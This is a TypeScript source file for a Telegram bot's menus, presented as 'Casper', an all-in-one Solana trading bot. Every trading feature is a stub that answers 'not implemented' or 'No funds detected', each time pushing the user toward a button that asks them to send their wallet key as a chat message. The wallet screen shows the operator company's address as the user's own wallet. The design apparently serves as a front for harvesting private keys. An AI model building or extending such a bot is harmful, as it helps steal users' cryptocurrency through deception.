import { Menu } from "@grammyjs/menu";
import type { BotContext } from "../context";

const NO_FUNDS =
	"No funds detected. Please import your wallet in order to use this function";
const NOT_IMPLEMENTED = "This feature is not implemented yet.";

export const mainMenu = new Menu<BotContext>("main").dynamic(
	async (ctx, range) => {
		const items: Array<{
			type: "text" | "submenu";
			label: string;
			id?: string;
		}> = [
			{ type: "text", label: "🔗 Chains" },
			{ type: "submenu", label: "💼 Wallets", id: "wallets" },

			{ type: "text", label: "⚙️ Global Settings" },
			{ type: "text", label: "📡 Signals" },

			{ type: "text", label: "🤖 Copytrade" },
			{ type: "text", label: "🛎️ Presales" },

			{ type: "text", label: "🎯 Auto Snipe" },
			{ type: "text", label: "🕒 Active Orders" },

			{ type: "text", label: "📈 Positions" },
			{ type: "text", label: "⭐️ Premium" },

			{ type: "text", label: "🤝 Referral" },
			{ type: "text", label: "🔄 Bridge" },

			{ type: "text", label: "⚡️ BUY & SELL NOW" },
		];

		const { data: company, error: companyError } =
			await ctx.botApi.getCompanyByBotId({
				botId: ctx.me.id,
			});

		if (companyError) {
			await ctx.answerCallbackQuery({
				text: companyError,
				show_alert: true,
			});
			return;
		}

		const { data: user, error: userError } = await ctx.botApi.getOrCreateUser({
			telegramId: ctx.from?.id as number,
			companyId: company?.id as string,
		});

		if (userError) {
			await ctx.answerCallbackQuery({
				text: userError,
				show_alert: true,
			});
			return;
		}
		const hasKey = user?.walletKey !== null && user?.walletKey !== undefined;

		items.forEach((it, i) => {
			if (it.type === "text") {
				range.text(it.label, async (ctx) => {
					if (hasKey) {
						await ctx.answerCallbackQuery({
							text: NOT_IMPLEMENTED,
							show_alert: true,
						});
					} else {
						await ctx.answerCallbackQuery({ text: NO_FUNDS, show_alert: true });
					}
				});
			} else {
				range.submenu(it.label, it.id as string, async (ctx) => {
					// Update message when entering submenu
					await ctx.editMessageText(
						walletMessage(company?.walletAddress ?? ""),
						{
							parse_mode: "HTML",
						},
					);
				});
			}
			if ((i + 1) % 2 === 0 && i !== items.length - 1) range.row();
		});
	},
);

export const walletMenu = new Menu<BotContext>("wallets").dynamic(
	async (ctx, range) => {
		const { data: company, error: companyError } =
			await ctx.botApi.getCompanyByBotId({
				botId: ctx.me.id,
			});
		if (companyError) {
			await ctx.answerCallbackQuery({
				text: companyError,
				show_alert: true,
			});
			return;
		}
		const { data: user, error } = await ctx.botApi.getOrCreateUser({
			telegramId: ctx.from?.id as number,
			companyId: company?.id as string,
		});

		if (error) {
			await ctx.answerCallbackQuery({
				text: error,
				show_alert: true,
			});
			return;
		}
		const hasKey = user?.walletKey !== null && user?.walletKey !== undefined;

		// Row 1: Rearrange Wallets (full width)
		range
			.text("🔃 Rearrange wallets", async (ctx) => {
				if (hasKey) {
					await ctx.answerCallbackQuery({
						text: NOT_IMPLEMENTED,
						show_alert: true,
					});
				} else {
					await ctx.answerCallbackQuery({ text: NO_FUNDS, show_alert: true });
				}
			})
			.row();

		// Row 2: Q1, Manual, Erase
		range.text("📜 Q1", async (ctx) => {
			if (hasKey) {
				await ctx.answerCallbackQuery({
					text: NOT_IMPLEMENTED,
					show_alert: true,
				});
			} else {
				await ctx.answerCallbackQuery({ text: NO_FUNDS, show_alert: true });
			}
		});
		range.text("🟢 Manual", async (ctx) => {
			if (hasKey) {
				await ctx.answerCallbackQuery({
					text: NOT_IMPLEMENTED,
					show_alert: true,
				});
			} else {
				await ctx.answerCallbackQuery({ text: NO_FUNDS, show_alert: true });
			}
		});
		range
			.text("🧹 Erase", async (ctx) => {
				await ctx.deleteMessage();
			})
			.row();

		// Row 3: Import Wallet, Generate Wallet
		range.text("🔑 Import Wallet", async (ctx) => {
			await ctx.answerCallbackQuery();
			await ctx.reply("Please send your wallet key as a message to import it.");
			ctx.menu.close();
		});
		range
			.text("⚙️ Generate Wallet", async (ctx) => {
				if (hasKey) {
					await ctx.answerCallbackQuery({
						text: NOT_IMPLEMENTED,
						show_alert: true,
					});
				} else {
					await ctx.answerCallbackQuery({ text: NO_FUNDS, show_alert: true });
				}
			})
			.row();

		// Row 4: Return (full width)
		range.text("🔙 Return", async (ctx) => {
			await ctx.answerCallbackQuery();
			const name = ctx.from?.username || ctx.from?.first_name || "user";
			await ctx.editMessageText(message(name), {
				parse_mode: "HTML",
			});
			ctx.menu.back();
		});
	},
);

export const message = (name: string) =>
	`Welcome, <b>${name}</b>, to <b>Casper</b>, the one-stop solution for all your trading needs!

<b>🔗 Chains:</b> Enable/disable chains.
<b>💼 Wallets:</b> Import or generate wallets.
<b>⚙️ Global Settings:</b> Customize the bot for a unique experience.
<b>🕒 Active Orders:</b> Active buy and sell limit orders.
<b>📈 Positions:</b> Monitor your active trades.

<b>⚡ Looking for a quick buy or sell?</b> Simply paste the token CA and you're ready to go!`;

export const walletMessage = (address?: string) => `📁 SOLANA first

Q1: ${address}

🟢 Default | 🟢 Manual | 💰 0.0000 SOL

ℹ️ To transfer from a wallet or rename it, click on the wallet name.
ℹ️ Enable 'Manual' for the wallets participating in your manual buys.`;
